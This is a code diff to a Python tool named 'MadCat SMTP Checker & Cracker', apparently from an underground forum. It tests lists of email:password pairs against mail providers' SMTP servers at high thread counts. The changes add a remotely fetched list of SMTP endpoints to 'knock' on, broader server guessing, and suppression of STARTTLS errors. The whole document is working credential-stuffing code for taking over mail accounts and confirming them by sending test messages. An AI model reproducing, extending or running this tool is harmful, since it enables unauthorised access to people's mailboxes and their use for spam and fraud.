@@ -12,8 +12,12 @@ except ImportError:
 
 # mail providers, where SMTP access is desabled by default
 bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo'
+# needed for faster and stable dns resolutions
 custom_dns_nameservers = ['8.8.8.8', '8.8.4.4', '9.9.9.9', '149.112.112.112', '1.1.1.1', '1.0.0.1', '76.76.19.19', '2001:4860:4860::8888', '2001:4860:4860::8844']
+# for the sake of history
 autoconfig_url = 'https://autoconfig.thunderbird.net/v1.1/'
+# expanded lists of SMTP endpoints, where we can knock
+autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -39,7 +43,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v22.09.30{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v22.10.02{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/freebug
@@ -85,6 +89,22 @@ def tune_network():
 		# 	print('Better to run this script as root to allow better network performance')
 	except:
 		pass
+
+def load_smtp_configs():
+	global autoconfig_data_url
+	domain_configs_cache = {}
+	try:
+		configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
+		for line in configs:
+			line = line.strip().split(';')
+			if len(line) != 3:
+				continue
+			domain_configs_cache[line[0]] = (line[1].split(','), line[2])
+		return domain_configs_cache
+	except Exception as e:
+		print(err+'failed to load SMTP configs. '+str(e))
+		print(err+'performance will be affected.')
+		return False
 
 def first(a):
 	return (a or ['']).pop(0)
@@ -132,53 +152,33 @@ def get_alive_neighbor(ip, port):
 		raise Exception('No listening neighbors found for '+ip+':'+str(port))
 
 def guess_smtp_server(domain):
-	global default_login_template, resolver_obj
-	domains_arr = [domain, 'smtp-qa.'+domain, 'qa-smtp.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
+	global default_login_template, resolver_obj, global_configs_cache
+	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
 	try:
 		mx_domain = str(resolver_obj.resolve(domain, 'mx')[0].exchange)[0:-1]
+		if re.search(r'protection\.outlook\.com$', mx_domain):
+			return global_configs_cache['outlook.com']
 		domains_arr += [mx_domain]
+		for host in domains_arr:
+			try:
+				ip = get_rand_ip_of_host(host)
+			except:
+				continue
+			for port in [587, 465, 25]:
+				if is_listening(ip, port):
+						return ([host+':'+str(port)], default_login_template)
 	except:
 		pass
-	for host in domains_arr:
-		try:
-			ip = get_rand_ip_of_host(host)
-		except:
-			continue
-		for port in [587, 465, 25]:
-			try:
-				if is_listening(ip, port):
-					return (host, str(port), default_login_template)
-			except:
-				pass
 	return False
 
 def get_smtp_config(domain):
-	global mx_cache
+	global domain_configs_cache
 	domain = domain.lower()
-	if not domain in mx_cache:
-		try:
-			xml = requests.get(autoconfig_url+domain, timeout=5).text
-		except:
-			xml = ''
-		smtp_host = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<hostname>([\w.-]+)</hostname>', xml))
-		smtp_port = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<port>(\d+)</port>', xml))
-		smtp_login_template = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml))
-		if smtp_host and smtp_port and smtp_login_template:
-			for postfix in ['-qa', '-qa2', '-nokia']:
-				smtp_qa_host = re.sub(r'^[\w-]+\.', smtp_host.split('.')[0]+postfix+'.', smtp_host)
-				try:
-					ip = get_rand_ip_of_host(smtp_qa_host)
-					if is_listening(ip, smtp_port):
-						smtp_host = smtp_qa_host
-						break
-				except:
-					pass
-			mx_cache[domain] = (smtp_host, smtp_port, smtp_login_template)
-		else:
-			mx_cache[domain] = guess_smtp_server(domain)
-	if not mx_cache[domain]:
+	if not domain in domain_configs_cache:
+		domain_configs_cache[domain] = guess_smtp_server(domain)
+	if not domain_configs_cache[domain]:
 		raise Exception('no connection details found for '+domain)
-	return mx_cache[domain]
+	return domain_configs_cache[domain]
 
 def get_free_smtp_server(smtp_server, port):
 	smtp_class = smtplib.SMTP_SSL if str(port) == '465' else smtplib.SMTP
@@ -231,9 +231,13 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 	server_obj = get_free_smtp_server(smtp_server, port)
 	server_obj.set_debuglevel(debuglevel)
 	server_obj.ehlo()
-	if server_obj.has_extn('starttls') and port != '465':
-		server_obj.starttls()
-		server_obj.ehlo()
+	# if server_obj.has_extn('starttls') and port != '465':
+	try:
+		if port != '465':
+			server_obj.starttls()
+			server_obj.ehlo()
+	except:
+		pass
 	server_obj.login(smtp_login, password)
 	if verify_email:
 		headers_arr = [
@@ -275,7 +279,8 @@ def worker_item(jobs_que, results_que):
 			try:
 				results_que.put(f'getting settings for {smtp_user}:{password}')
 				if not smtp_server or not port:
-					smtp_server, port, login_template = get_smtp_config(smtp_user.split('@')[1])
+					smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
+					smtp_server, port = random.choice(smtp_server_port_arr).split(':')
 				results_que.put(blue('connecting to',0)+f' {smtp_server}|{port}|{smtp_user}|{password}')
 				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
 				results_que.put(green(smtp_user+':'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
@@ -374,7 +379,7 @@ net_usage = 0
 min_threads = 50
 max_threads = debuglevel or rage_mode and 600 or 300
 threads_counter = 0
-mx_cache = {}
+domain_configs_cache = load_smtp_configs()
 no_jobs_left = False
 loop_times = []
 loop_time = 0
@@ -385,6 +390,7 @@ total_lines = wc_count(list_filename)
 resolver_obj = resolver.Resolver()
 resolver_obj.nameservers = custom_dns_nameservers
 
+print(okk+'loading SMTP configs:          '+bold(num(len(domain_configs_cache))+' lines'))
 print(inf+'source file:                   '+bold(list_filename))
 print(inf+'total lines to procceed:       '+bold(num(total_lines)))
 print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
